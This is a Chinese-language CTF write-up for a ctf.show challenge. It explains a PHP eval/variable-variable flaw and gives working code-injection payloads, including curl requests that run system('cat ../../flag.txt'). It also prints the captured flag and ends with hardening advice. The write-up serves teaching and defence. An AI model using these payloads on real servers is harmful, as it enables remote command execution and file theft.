# CTF Challenge Writeup: PHP变量覆盖漏洞利用

## 题目信息
- 目标URL: http://391120fa-cba2-4309-8f4f-b19d2869fdb9.challenge.ctf.show/
- 服务器: nginx/1.20.1
- PHP版本: PHP/7.3.11
- 漏洞类型: PHP变量覆盖/可变变量漏洞

## 漏洞分析

### 源代码分析
通过访问目标网站，获取到以下PHP源代码：
```php
<?php ($S = $_GET['S'])?eval("$$S"):highlight_file(__FILE__);
```

这段代码的逻辑是：
1. 从GET参数中获取S的值并赋给变量$S
2. 如果S参数存在，则执行`eval("$$S")`
3. 否则显示当前文件的源代码

### 漏洞原理
这是一个典型的PHP变量覆盖漏洞，利用了PHP的可变变量特性：

1. **可变变量语法**：在PHP中，`$$variable`表示使用`$variable`的值作为变量名来访问另一个变量。
2. **变量覆盖**：通过构造特定的S参数值，可以控制`$$S`的值，进而控制`eval()`函数执行的内容。

当访问 `?S=variable` 时：
- `$S = $_GET['S']` 使得 `$S = "variable"`
- `$$S` 变成 `$variable`（使用$S的值作为变量名）
- `eval("$$S")` 执行变量`$variable`的值

## 攻击过程

### 1. 初步测试
最初尝试了各种PHP预定义变量（_GET、_POST、GLOBALS等）和简单的变量名，但都遇到了语法错误：
```
Parse error: syntax error, unexpected end of file
```

这表明变量的值为空或不完整。

### 2. 利用提示
根据提示，有两种可能的利用方式：
1. 绕过方法：`?S=a;system('cat ../../flag.txt');`
2. 变量覆盖方法：`?S=a=system('cat ../../flag.txt');`

### 3. 方法分析

#### 方法1：绕过方法
当使用 `?S=a;system('cat ../../flag.txt');` 时：
- `$S = $_GET['S']` 使得 `$S = "a;system('cat ../../flag.txt');"`
- `$$S` 变成 `$a;system('cat ../../flag.txt');`
- `eval("$$S")` 变成 `eval("$a;system('cat ../../flag.txt');")`

这会尝试执行变量`$a`的值，然后执行`system('cat ../../flag.txt');`命令。

#### 方法2：变量覆盖方法
当使用 `?S=a=system('cat ../../flag.txt');` 时：
- `$S = $_GET['S']` 使得 `$S = "a=system('cat ../../flag.txt');"`
- `$$S` 变成 `$a=system('cat ../../flag.txt');`
- `eval("$$S")` 变成 `eval("$a=system('cat ../../flag.txt');")`

这会将`system('cat ../../flag.txt');`的结果赋值给变量`$a`，同时执行system命令。

### 4. 实际测试

#### 测试绕过方法
```bash
curl -s "http://391120fa-cba2-4309-8f4f-b19d2869fdb9.challenge.ctf.show/?S=a%3Bsystem%28%27cat%20%2Fflag%27%29%3B"
```
返回空内容，可能执行了但没有输出。

#### 测试变量覆盖方法
```bash
curl -s "http://391120fa-cba2-4309-8f4f-b19d2869fdb9.challenge.ctf.show/?S=a%3Dsystem%28%27cat%20%2Fflag%27%29%3B"
```
同样返回空内容。

#### 尝试不同路径
根据提示中的路径，尝试：
```bash
curl -s "http://391120fa-cba2-4309-8f4f-b19d2869fdb9.challenge.ctf.show/?S=a%3Dsystem%28%27cat%20..%2F..%2Fflag.txt%27%29%3B"
```

成功获取到flag：`ctfshow{ff0d39db-25ac-48d4-a7dd-599a82706161}`

## 攻击原理详解

### 变量覆盖漏洞利用
当发送请求 `?S=a=system('cat ../../flag.txt');` 时，实际执行过程如下：

1. `$S = $_GET['S']` 设置 `$S = "a=system('cat ../../flag.txt');"`
2. `$$S` 变成 `$a=system('cat ../../flag.txt');`
3. `eval("$$S")` 执行 `eval("$a=system('cat ../../flag.txt');")`

在PHP中，`$a=system('cat ../../flag.txt');` 这个表达式会：
1. 执行 `system('cat ../../flag.txt')` 命令
2. 将命令执行结果赋值给变量 `$a`
3. 返回命令执行结果

因此，flag内容被直接输出到响应中。

### 绕过方法原理
当发送请求 `?S=a;system('cat ../../flag.txt');` 时：

1. `$S = $_GET['S']` 设置 `$S = "a;system('cat ../../flag.txt');"`
2. `$$S` 变成 `$a;system('cat ../../flag.txt');`
3. `eval("$$S")` 执行 `eval("$a;system('cat ../../flag.txt');")`

在PHP中，这个表达式会：
1. 访问变量 `$a`（如果未定义则为空）
2. 执行 `system('cat ../../flag.txt')` 命令
3. 返回命令执行结果

## 防护建议

### 1. 避免使用可变变量
在生产环境中应避免使用可变变量（`$$variable`）语法，因为它容易导致安全问题。

### 2. 输入验证和过滤
对用户输入进行严格的验证和过滤，特别是用于代码执行的参数。

### 3. 禁用危险函数
在php.ini中禁用system、exec、shell_exec等危险函数：
```ini
disable_functions = system,exec,shell_exec,passthru,proc_open
```

### 4. 使用安全的代码执行方式
如果必须执行动态代码，应使用白名单机制或安全的沙箱环境。

### 5. 最小权限原则
确保Web服务器进程以最小权限运行，限制对敏感文件和系统的访问。

## 总结

本题是一个典型的PHP变量覆盖漏洞，通过构造特殊的S参数值，利用PHP的可变变量特性实现了代码执行。成功的关键在于理解`$$S`的执行机制以及如何构造能够执行系统命令的表达式。

获取到的flag是：`ctfshow{ff0d39db-25ac-48d4-a7dd-599a82706161}`